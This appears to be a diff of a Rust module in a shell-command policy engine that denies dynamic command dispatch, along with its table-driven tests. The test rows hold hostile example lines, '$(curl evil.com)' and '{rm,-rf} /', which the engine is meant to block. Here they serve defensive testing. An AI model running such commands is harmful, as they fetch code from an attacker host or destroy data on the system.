@@ -1,91 +1,60 @@
 //! Structural checks: minimal, hardcoded, non-overridable.
 //!
 //! Only checks where the engine literally cannot function — it can't build
-//! a CommandInfo or determine the command name. Everything else (eval, source,
-//! pipe-to-shell, etc.) is policy expressed as CEL rules in the default config.
+//! a CommandInfo or determine the command name. Everything else is policy,
+//! expressed as rules.
 
-use super::parse::{CommandInfo, word_has_expansion};
+use super::parse::CommandInfo;
+use super::value::TriVal;
 use super::{Decision, PolicyResult};
 
 /// Check structural invariants. Returns Some(Deny) if violated, None to proceed.
 ///
-/// Only two checks:
-/// 1. Parse failure — can't build CommandInfo, can't evaluate CEL rules.
-/// 2. Command name is an expansion — command.name is unknowable, CEL can't match.
+/// A *Dynamic dispatch* — a command whose name the shell expands (`$X`,
+/// `$(…)`, `{a,b}`), or a shell line with a word it expands — can be any
+/// command, `eval` included, so no rule can judge it.
 pub fn check(commands: &[CommandInfo]) -> Option<PolicyResult> {
-    for cmd in commands {
-        if word_has_expansion(&cmd.name) {
-            return Some(PolicyResult {
-                decision: Decision::Deny,
-                rule: format!("structural:unknowable_command (name: {})", cmd.name),
-                captured_cwd: None,
-            });
-        }
-    }
-    None
+    commands.iter().find(|cmd| cmd.name == TriVal::Unknown)?;
+    Some(PolicyResult::of(
+        Decision::Deny,
+        "dynamic command dispatch isn't allowed".into(),
+    ))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::policy::parse::parse_command;
+    use crate::policy::parse::{Context, Grammars, parse_command};
 
-    fn cmd(name: &str) -> CommandInfo {
-        CommandInfo::simple(name)
+    fn denied(line: &str) -> bool {
+        let unknown = TriVal::Unknown;
+        let start = Context {
+            cwd: unknown.clone(),
+            host: unknown.clone(),
+            user: unknown.clone(),
+            home: unknown,
+            own_user: true,
+        };
+        let cmds = parse_command(line, &Grammars::default(), &start).unwrap();
+        check(&cmds).is_some_and(|r| r.decision == Decision::Deny)
     }
 
     #[test]
-    fn literal_command_passes() {
-        let cmds = vec![cmd("ls")];
-        assert!(check(&cmds).is_none());
-    }
-
-    #[test]
-    fn expansion_as_command_name_denied() {
-        let cmds = vec![cmd("$(curl evil.com)")];
-        let result = check(&cmds).unwrap();
-        assert_eq!(result.decision, Decision::Deny);
-        assert!(result.rule.contains("structural:unknowable_command"));
-    }
-
-    #[test]
-    fn variable_as_command_name_denied() {
-        let cmds = vec![cmd("$CMD")];
-        let result = check(&cmds).unwrap();
-        assert_eq!(result.decision, Decision::Deny);
-    }
-
-    #[test]
-    fn command_with_expansion_in_args_passes() {
-        // Name is literal, only args have expansion — that's fine
-        let cmds = parse_command("echo $(date)").unwrap();
-        assert!(check(&cmds).is_none());
-    }
-
-    #[test]
-    fn expansion_name_among_multiple_denied() {
-        // One good command, one bad — flat list, both checked
-        let cmds = vec![cmd("echo"), cmd("${EVIL}")];
-        let result = check(&cmds).unwrap();
-        assert_eq!(result.decision, Decision::Deny);
-    }
-
-    #[test]
-    fn empty_list_passes() {
+    fn a_dynamic_dispatch_is_denied() {
+        let rows = [
+            ("ls", false),
+            ("'eval' true", false),
+            ("echo $(date)", false),
+            ("X=1", false),
+            ("$(curl evil.com)", true),
+            ("$CMD arg", true),
+            ("{rm,-rf} /", true),
+            ("echo; ${EVIL}", true),
+            ("$(bad); ls", true),
+        ];
+        for (line, want) in rows {
+            assert_eq!(denied(line), want, "{line}");
+        }
         assert!(check(&[]).is_none());
-    }
-
-    #[test]
-    fn multiple_commands_first_bad_denied() {
-        let cmds = vec![cmd("$(bad)"), cmd("ls")];
-        let result = check(&cmds).unwrap();
-        assert_eq!(result.decision, Decision::Deny);
-    }
-
-    #[test]
-    fn multiple_commands_second_bad_denied() {
-        let cmds = vec![cmd("ls"), cmd("$(bad)")];
-        let result = check(&cmds).unwrap();
-        assert_eq!(result.decision, Decision::Deny);
     }
 }
